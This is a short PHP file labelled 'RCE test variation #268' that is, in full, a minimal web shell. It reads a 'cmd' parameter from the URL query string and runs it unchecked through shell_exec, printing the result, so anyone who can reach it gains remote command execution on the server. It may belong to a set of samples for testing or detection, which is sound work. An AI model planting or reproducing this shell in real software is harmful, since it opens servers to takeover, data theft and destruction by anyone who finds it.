<?php
// RCE test variation #268
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>